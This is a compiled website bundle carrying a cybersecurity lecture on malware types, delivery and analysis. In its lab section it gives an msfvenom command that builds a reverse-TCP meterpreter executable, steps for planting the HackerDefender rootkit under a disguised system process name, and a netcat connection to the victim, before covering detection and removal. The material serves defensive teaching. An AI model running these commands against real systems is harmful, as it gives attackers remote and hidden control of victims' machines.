"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[5947],{7539:(e,i,n)=>{n.r(i),n.d(i,{assets:()=>o,contentTitle:()=>t,default:()=>h,frontMatter:()=>l,metadata:()=>a,toc:()=>c});var s=n(5893),r=n(1151);const l={},t="Malware Threats",a={id:"lectures/defensive/malware-threats/README",title:"Malware Threats",description:"1. What is malware",source:"@site/docs/lectures/defensive/malware-threats/README.md",sourceDirName:"lectures/defensive/malware-threats",slug:"/lectures/defensive/malware-threats/",permalink:"/cybersecurity-handbook/lectures/defensive/malware-threats/",draft:!1,unlisted:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Cyber Threat Intelligence",permalink:"/cybersecurity-handbook/lectures/defensive/cyber-threat-intelligence/"},next:{title:"Introduction of Vulnerability Management",permalink:"/cybersecurity-handbook/lectures/defensive/vuln-management-fundamentals/"}},o={},c=[{value:"1. Malware",id:"1-malware",level:2},{value:"A. Virus",id:"a-virus",level:3},{value:"Different types of viruses",id:"different-types-of-viruses",level:4},{value:"B. Worm",id:"b-worm",level:3},{value:"C. Trojan",id:"c-trojan",level:3},{value:"D. Hybrid",id:"d-hybrid",level:3},{value:"E. Ransomware &amp; Crypto-malware",id:"e-ransomware--crypto-malware",level:3},{value:"F. Fileless",id:"f-fileless",level:3},{value:"G. Adware",id:"g-adware",level:3},{value:"H. Spyware",id:"h-spyware",level:3},{value:"I Rootkit",id:"i-rootkit",level:3},{value:"J. Bots / Botnets",id:"j-bots--botnets",level:3},{value:"Keylogger",id:"keylogger",level:4},{value:"K. RATs (Remote Access Trojans or Remote Administration Tools)",id:"k-rats-remote-access-trojans-or-remote-administration-tools",level:3},{value:"L. Logic or Time bomb",id:"l-logic-or-time-bomb",level:3},{value:"M. Backdoor",id:"m-backdoor",level:3},{value:"N. APT (Advanced Persistent Threat)",id:"n-apt-advanced-persistent-threat",level:3},{value:"2. Malware Delivery",id:"2-malware-delivery",level:2},{value:"Malvertising",id:"malvertising",level:3},{value:"Phishing",id:"phishing",level:3},{value:"3. Analyze and Classify",id:"3-analyze-and-classify",level:2},{value:"Static analysis with Kali Linux",id:"static-analysis-with-kali-linux",level:3},{value:"RootKit discovering with Windows",id:"rootkit-discovering-with-windows",level:3},{value:"Rootkit exploitation example",id:"rootkit-exploitation-example",level:4},{value:"Remediation",id:"remediation",level:4}];function d(e){const i={blockquote:"blockquote",code:"code",em:"em",h1:"h1",h2:"h2",h3:"h3",h4:"h4",hr:"hr",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,r.a)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(i.h1,{id:"malware-threats",children:"Malware Threats"}),"\n",(0,s.jsxs)(i.ol,{children:["\n",(0,s.jsx)(i.li,{children:"What is malware"}),"\n",(0,s.jsx)(i.li,{children:"Malware delivery"}),"\n",(0,s.jsx)(i.li,{children:"Analyze and classify malware"}),"\n"]}),"\n",(0,s.jsx)(i.h2,{id:"1-malware",children:"1. Malware"}),"\n",(0,s.jsxs)(i.ul,{children:["\n",(0,s.jsx)(i.li,{children:"A. Virus"}),"\n",(0,s.jsx)(i.li,{children:"B. Worm"}),"\n",(0,s.jsx)(i.li,{children:"C. Trojan"}),"\n",(0,s.jsx)(i.li,{children:"D. Hybrid"}),"\n",(0,s.jsx)(i.li,{children:"E. Ransomware & Crypto-malware"}),"\n",(0,s.jsx)(i.li,{children:"F. Fileless"}),"\n",(0,s.jsx)(i.li,{children:"G. Adware"}),"\n",(0,s.jsxs)(i.li,{children:["H. Spyware","\n",(0,s.jsxs)(i.ul,{children:["\n",(0,s.jsx)(i.li,{children:"Keylogger"}),"\n"]}),"\n"]}),"\n",(0,s.jsx)(i.li,{children:"I. Rootkit"}),"\n",(0,s.jsx)(i.li,{children:"J. Bots / Botnets"}),"\n",(0,s.jsx)(i.li,{children:"K. RATs"}),"\n",(0,s.jsx)(i.li,{children:"L. Logic or Time bomb"}),"\n",(0,s.jsx)(i.li,{children:"M. Backdoor"}),"\n",(0,s.jsx)(i.li,{children:"N. APT"}),"\n"]}),"\n",(0,s.jsx)(i.h3,{id:"a-virus",children:"A. Virus"}),"\n",(0,s.jsx)(i.p,{children:"A program intended to damage a host (computer system) and requires user interaction"}),"\n",(0,s.jsx)(i.h4,{id:"different-types-of-viruses",children:"Different types of viruses"}),"\n",(0,s.jsxs)(i.ul,{children:["\n",(0,s.jsxs)(i.li,{children:[(0,s.jsx)(i.strong,{children:"Armored"}),": protected in a way that makes disassembling it difficult. Thus, antivirus programs have trouble getting to, and understanding, its code."]}),"\n",(0,s.jsxs)(i.li,{children:[(0,s.jsx)(i.strong,{children:"Companion"}),": creates a new program that runs in the place of an expected program of the same name."]}),"\n",(0,s.jsxs)(i.li,{children:[(0,s.jsx)(i.strong,{children:"Macro"}),": software exploitation virus that works by using the macro feature included in many applications, such as Microsoft Office."]}),"\n",(0,s.jsxs)(i.li,{children:[(0,s.jsx)(i.strong,{children:"Multipartite"}),": attacks a system in more than one way."]}),"\n",(0,s.jsxs)(i.li,{children:[(0,s.jsx)(i.strong,{children:"Phage"}),": modifies and alters other programs."]}),"\n",(0,s.jsxs)(i.li,{children:[(0,s.jsx)(i.strong,{children:"Polymorphic"}),": changes form or mutates in order to avoid detection."]}),"\n",(0,s.jsxs)(i.li,{children:[(0,s.jsx)(i.strong,{children:"Retro"}),": attacks or bypasses the antirivrus software."]}),"\n",(0,s.jsxs)(i.li,{children:[(0,s.jsx)(i.strong,{children:"Stealth"}),": attempts to avoid detection by anti-virus software and from OS by reamaining in memory."]}),"\n"]}),"\n",(0,s.jsx)(i.h3,{id:"b-worm",children:"B. Worm"}),"\n",(0,s.jsxs)(i.ul,{children:["\n",(0,s.jsx)(i.li,{children:"Self-propagate without user intervention."}),"\n",(0,s.jsx)(i.li,{children:"To spread, worms either exploit a vulnerability on the target system, or use social engineering."}),"\n",(0,s.jsx)(i.li,{children:"Usually takes advantage of file-transport or informartion-transport features to travel unaided."}),"\n",(0,s.jsxs)(i.li,{children:["Examples","\n",(0,s.jsxs)(i.ul,{children:["\n",(0,s.jsx)(i.li,{children:"Self-propagate"}),"\n",(0,s.jsx)(i.li,{children:"SQL Slammer"}),"\n",(0,s.jsx)(i.li,{children:"ILoveYou"}),"\n",(0,s.jsx)(i.li,{children:"MS Blaster"}),"\n",(0,s.jsx)(i.li,{children:"Slammer"}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,s.jsx)(i.h3,{id:"c-trojan",children:"C. Trojan"}),"\n",(0,s.jsx)(i.p,{children:"Harmful piece of software that looks legitimate or is included with legitimate applications."}),"\n",(0,s.jsxs)(i.ul,{children:["\n",(0,s.jsx)(i.li,{children:"User interaction"}),"\n",(0,s.jsxs)(i.li,{children:["Any application that masquerades as one thing in order to get past scrutiny and then does something malicious.","\n",(0,s.jsxs)(i.ul,{children:["\n",(0,s.jsx)(i.li,{children:"Email or websites"}),"\n",(0,s.jsx)(i.li,{children:"Fake antivirus/updates pop ups"}),"\n"]}),"\n"]}),"\n",(0,s.jsx)(i.li,{children:"One major difference with viruses is that trojans tend not to replicate themsleves."}),"\n",(0,s.jsxs)(i.li,{children:["Examples","\n",(0,s.jsxs)(i.ul,{children:["\n",(0,s.jsx)(i.li,{children:"BackOrifice"}),"\n",(0,s.jsx)(i.li,{children:"Stuxnet"}),"\n",(0,s.jsx)(i.li,{children:"Zeus"}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,s.jsx)(i.h3,{id:"d-hybrid",children:"D. Hybrid"}),"\n",(0,s.jsx)(i.p,{children:"Combine different types into a hybrid type."}),"\n",(0,s.jsx)(i.h3,{id:"e-ransomware--crypto-malware",children:"E. Ransomware & Crypto-malware"}),"\n",(0,s.jsxs)(i.ul,{children:["\n",(0,s.jsx)(i.li,{children:"Uses cryptography as part of the attack"}),"\n",(0,s.jsx)(i.li,{children:"Prevents user from accesing their files through encryption."}),"\n",(0,s.jsxs)(i.li,{children:["Examples","\n",(0,s.jsxs)(i.ul,{children:["\n",(0,s.jsx)(i.li,{children:"WannaCry"}),"\n",(0,s.jsx)(i.li,{children:"CryptoLocker"}),"\n",(0,s.jsx)(i.li,{children:"Locky"}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,s.jsx)(i.h3,{id:"f-fileless",children:"F. Fileless"}),"\n",(0,s.jsxs)(i.ul,{children:["\n",(0,s.jsx)(i.li,{children:"Running malware at the memory level instead of file level"}),"\n",(0,s.jsx)(i.li,{children:"Registry keys"}),"\n",(0,s.jsx)(i.li,{children:"Scheduled tasks"}),"\n",(0,s.jsx)(i.li,{children:"APIs"}),"\n",(0,s.jsxs)(i.li,{children:["\n",(0,s.jsxs)(i.blockquote,{children:["\n",(0,s.jsx)(i.p,{children:"50%"}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,s.jsx)(i.h3,{id:"g-adware",children:"G. Adware"}),"\n",(0,s.jsxs)(i.ul,{children:["\n",(0,s.jsx)(i.li,{children:"Ads"}),"\n",(0,s.jsx)(i.li,{children:"Browser"}),"\n",(0,s.jsx)(i.li,{children:"Freeware"}),"\n"]}),"\n",(0,s.jsx)(i.h3,{id:"h-spyware",children:"H. Spyware"}),"\n",(0,s.jsxs)(i.ul,{children:["\n",(0,s.jsx)(i.li,{children:"Covert monitoring"}),"\n",(0,s.jsx)(i.li,{children:"Harvest browsing information"}),"\n",(0,s.jsx)(i.li,{children:"Stealing Credentials"}),"\n",(0,s.jsx)(i.li,{children:"Screen capture"}),"\n",(0,s.jsx)(i.li,{children:"Capture email data"}),"\n"]}),"\n",(0,s.jsx)(i.h3,{id:"i-rootkit",children:"I Rootkit"}),"\n",(0,s.jsxs)(i.ul,{children:["\n",(0,s.jsx)(i.li,{children:"Designed to provide continued privileged access to a computer while actively hiding its presence."}),"\n",(0,s.jsx)(i.li,{children:"Ability to obtain administrator/root-level access and hide from OS."}),"\n",(0,s.jsxs)(i.li,{children:["Examples","\n",(0,s.jsxs)(i.ul,{children:["\n",(0,s.jsx)(i.li,{children:"NTRootkit"}),"\n",(0,s.jsx)(i.li,{children:"Zeus"}),"\n",(0,s.jsx)(i.li,{children:"Stuxnet"}),"\n",(0,s.jsx)(i.li,{children:"Knark"}),"\n",(0,s.jsx)(i.li,{children:"Adore"}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,s.jsx)(i.h3,{id:"j-bots--botnets",children:"J. Bots / Botnets"}),"\n",(0,s.jsxs)(i.p,{children:["A ",(0,s.jsx)(i.strong,{children:"Bot"})," is an automated software program. In its malicious form, is a compromised system being controlled remotely."]}),"\n",(0,s.jsxs)(i.p,{children:["A ",(0,s.jsx)(i.strong,{children:"Botnet"})," is a network of compromised computers under the control of a malicious actors."]}),"\n",(0,s.jsx)(i.h4,{id:"keylogger",children:"Keylogger"}),"\n",(0,s.jsx)(i.p,{children:"Tracks the activities from input devices (keyboard, mouse, screen recorders, scrapers, etc), which is either accessed later or automatically emailed to the attacker."}),"\n",(0,s.jsx)(i.h3,{id:"k-rats-remote-access-trojans-or-remote-administration-tools",children:"K. RATs (Remote Access Trojans or Remote Administration Tools)"}),"\n",(0,s.jsxs)(i.ul,{children:["\n",(0,s.jsx)(i.li,{children:"Software that remotely gives a person full control of a tech device."}),"\n",(0,s.jsx)(i.li,{children:"Provide the capability to allow covert surveillance or gain unauthorized access to devices and create backdoors."}),"\n",(0,s.jsxs)(i.li,{children:["Examples","\n",(0,s.jsxs)(i.ul,{children:["\n",(0,s.jsx)(i.li,{children:"SubSeven"}),"\n",(0,s.jsx)(i.li,{children:"Back Orifice"}),"\n",(0,s.jsx)(i.li,{children:"ProRat"}),"\n",(0,s.jsx)(i.li,{children:"Turkojan"}),"\n",(0,s.jsx)(i.li,{children:"Poison-Ivy"}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,s.jsx)(i.h3,{id:"l-logic-or-time-bomb",children:"L. Logic or Time bomb"}),"\n",(0,s.jsx)(i.p,{children:"Any code that is hidden within an application and causes something unexpected to happen based on some criteria."}),"\n",(0,s.jsx)(i.h3,{id:"m-backdoor",children:"M. Backdoor"}),"\n",(0,s.jsxs)(i.ul,{children:["\n",(0,s.jsxs)(i.li,{children:["\n",(0,s.jsx)(i.p,{children:"Any undocoumented way of accessing a system and bypassing normal authentication mechanisms."}),"\n"]}),"\n",(0,s.jsxs)(i.li,{children:["\n",(0,s.jsx)(i.p,{children:"An opening left in a program application (usually by the developer) that allows additional access to systems or data. These should be closed when the system is moved to production."}),"\n"]}),"\n"]}),"\n",(0,s.jsx)(i.h3,{id:"n-apt-advanced-persistent-threat",children:"N. APT (Advanced Persistent Threat)"}),"\n",(0,s.jsx)(i.p,{children:"A set of stealthy and continuous computer hacking processes, often orchestrated by an actor targeting a specific entity."}),"\n",(0,s.jsx)(i.p,{children:"The actor usually targets either private organizations, states, or both, for business or political motives."}),"\n",(0,s.jsx)(i.hr,{}),"\n",(0,s.jsx)(i.h2,{id:"2-malware-delivery",children:"2. Malware Delivery"}),"\n",(0,s.jsxs)(i.ul,{children:["\n",(0,s.jsx)(i.li,{children:"Malvertising"}),"\n",(0,s.jsx)(i.li,{children:"Phishing"}),"\n",(0,s.jsx)(i.li,{children:"Removable devices (usb)"}),"\n",(0,s.jsx)(i.li,{children:"Insider Threat"}),"\n"]}),"\n",(0,s.jsx)(i.h3,{id:"malvertising",children:"Malvertising"}),"\n",(0,s.jsxs)(i.ul,{children:["\n",(0,s.jsx)(i.li,{children:"Drive-by downloads that execute code without user interaction"}),"\n",(0,s.jsx)(i.li,{children:"Common in news portals"}),"\n"]}),"\n",(0,s.jsx)(i.h3,{id:"phishing",children:"Phishing"}),"\n",(0,s.jsxs)(i.ul,{children:["\n",(0,s.jsx)(i.li,{children:"Attacker uses fraudulent communication (such as emails) to lure victim into running malicious software or providing confidential information."}),"\n",(0,s.jsx)(i.li,{children:"Message is made to look as though it comes from a trusted sender."}),"\n"]}),"\n",(0,s.jsx)(i.hr,{}),"\n",(0,s.jsx)(i.h2,{id:"3-analyze-and-classify",children:"3. Analyze and Classify"}),"\n",(0,s.jsx)(i.h3,{id:"static-analysis-with-kali-linux",children:"Static analysis with Kali Linux"}),"\n",(0,s.jsx)(i.p,{children:"Suppose you are given samples from email attachments."}),"\n",(0,s.jsxs)(i.ol,{children:["\n",(0,s.jsx)(i.li,{children:"Emulate the malicious file."}),"\n"]}),"\n",(0,s.jsx)(i.pre,{children:(0,s.jsx)(i.code,{children:"msfvenom -a x86 --platform windows -p windows/meterpreter/reverse-tcp LHOST=192.168.0.100 LPORT=433 -f exe -o maliciousfile.exe\n"})}),"\n",(0,s.jsxs)(i.ol,{start:"2",children:["\n",(0,s.jsxs)(i.li,{children:["Using ",(0,s.jsx)(i.em,{children:"Binwalk"})," we will performed an automated analysis by ",(0,s.jsx)(i.em,{children:"scanning for common signatures"}),"."]}),"\n"]}),"\n",(0,s.jsx)(i.pre,{children:(0,s.jsx)(i.code,{children:"binwalk -B maliciousfile.exe    // static analysis\nbinwalk -3 maliciousfile.exe    // 3D analysis\nbinwalk -A maliciousfile.exe    // Find commonly used No Operation Opcodes (NOP) used in exploits to land shellcode.\n"})}),"\n",(0,s.jsxs)(i.ol,{start:"3",children:["\n",(0,s.jsxs)(i.li,{children:["Using ",(0,s.jsx)(i.em,{children:"Exiftool"})," we can produce similar information."]}),"\n"]}),"\n",(0,s.jsx)(i.pre,{children:(0,s.jsx)(i.code,{children:"exiftool maliciousfile.exe\n"})}),"\n",(0,s.jsxs)(i.ol,{start:"4",children:["\n",(0,s.jsxs)(i.li,{children:["Hash file with ",(0,s.jsx)(i.em,{children:"MD5Deep"})," and add this to your analysis report for future references."]}),"\n"]}),"\n",(0,s.jsx)(i.pre,{children:(0,s.jsx)(i.code,{children:"md5deep maliciousfile.exe\n"})}),"\n",(0,s.jsx)(i.h3,{id:"rootkit-discovering-with-windows",children:"RootKit discovering with Windows"}),"\n",(0,s.jsxs)(i.p,{children:["We can use the ",(0,s.jsx)(i.em,{children:"Rootkit Revealer Tool"}),"."]}),"\n",(0,s.jsxs)(i.ol,{children:["\n",(0,s.jsxs)(i.li,{children:["Place a rootkit, you can use a simple rootkit such as ",(0,s.jsx)(i.em,{children:"HackerDefender"})," from ",(0,s.jsx)(i.em,{children:"carnal0wnage"}),", let's run ",(0,s.jsx)(i.code,{children:"cmd"})," and the following commands."]}),"\n"]}),"\n",(0,s.jsx)(i.pre,{children:(0,s.jsx)(i.code,{children:'tasklist                    // list processes & choose a process to mimic, we will use some similar name\nnetstat -an                 // find currently open ports, pick one next to the legitimate ones already open\ncd "C:\\Windows\\System32"    // change directory to the rootkit, so it looks like a legitimate system file\nrename <rootkey EXE> <fake_process_name>.exe\nrename <rootkey INI> <fake_process_name>.ini\n'})}),"\n",(0,s.jsxs)(i.ol,{start:"2",children:["\n",(0,s.jsxs)(i.li,{children:["Make sure rootkey is properly configured (",(0,s.jsx)(i.code,{children:".ini"})," file) with fake process name, ports and settings and load initializatio nfile into memory."]}),"\n"]}),"\n",(0,s.jsx)(i.pre,{children:(0,s.jsx)(i.code,{children:"<fake_process_name>.ini -:refresh\n"})}),"\n",(0,s.jsxs)(i.ol,{start:"3",children:["\n",(0,s.jsx)(i.li,{children:"Run rootkit"}),"\n"]}),"\n",(0,s.jsx)(i.pre,{children:(0,s.jsx)(i.code,{children:"./<fake_process_name>.exe\n"})}),"\n",(0,s.jsxs)(i.ol,{start:"4",children:["\n",(0,s.jsxs)(i.li,{children:["Now lunch ",(0,s.jsx)(i.em,{children:"Rootkit Revealer"})," and scan. You should discover your rootkit if using well known files such as ",(0,s.jsx)(i.em,{children:"HackerDefender"})," example."]}),"\n"]}),"\n",(0,s.jsx)(i.h4,{id:"rootkit-exploitation-example",children:"Rootkit exploitation example"}),"\n",(0,s.jsxs)(i.p,{children:["If you were happen to use ",(0,s.jsx)(i.em,{children:"HackerDefender"})," rootkit, you would be able to connect with ",(0,s.jsx)(i.em,{children:"Netcat"})," to victim."]}),"\n",(0,s.jsx)(i.pre,{children:(0,s.jsx)(i.code,{children:"netcat <target_ip> <open_port>\nhostname // verify connection\n"})}),"\n",(0,s.jsx)(i.h4,{id:"remediation",children:"Remediation"}),"\n",(0,s.jsxs)(i.ol,{children:["\n",(0,s.jsxs)(i.li,{children:["Find suspicious processes with ",(0,s.jsx)(i.em,{children:"Rootkit Revealer"})," and ",(0,s.jsx)(i.code,{children:"cmd"})," -> ",(0,s.jsx)(i.code,{children:"tasklist"}),"."]}),"\n",(0,s.jsxs)(i.li,{children:["Stop suspicious process with ",(0,s.jsx)(i.code,{children:"taskkill /F /pid <PID#>"}),"."]}),"\n",(0,s.jsxs)(i.li,{children:["Confirm suspicious service in ",(0,s.jsx)(i.code,{children:"services.msc"}),"."]}),"\n",(0,s.jsxs)(i.li,{children:["Delete suspicious service ",(0,s.jsx)(i.code,{children:"sc delete <service name>"}),"."]}),"\n",(0,s.jsxs)(i.li,{children:["Using registry information from ",(0,s.jsx)(i.em,{children:"Rootkit Revelear"}),", find those keys in ",(0,s.jsx)(i.code,{children:"regedit"})," and delete everything you can."]}),"\n",(0,s.jsx)(i.li,{children:"Verify RootKit removal running scans again."}),"\n"]})]})}function h(e={}){const{wrapper:i}={...(0,r.a)(),...e.components};return i?(0,s.jsx)(i,{...e,children:(0,s.jsx)(d,{...e})}):d(e)}},1151:(e,i,n)=>{n.d(i,{Z:()=>a,a:()=>t});var s=n(7294);const r={},l=s.createContext(r);function t(e){const i=s.useContext(l);return s.useMemo((function(){return"function"==typeof e?e(i):{...i,...e}}),[i,e])}function a(e){let i;return i=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:t(e.components),s.createElement(l.Provider,{value:i},e.children)}}}]);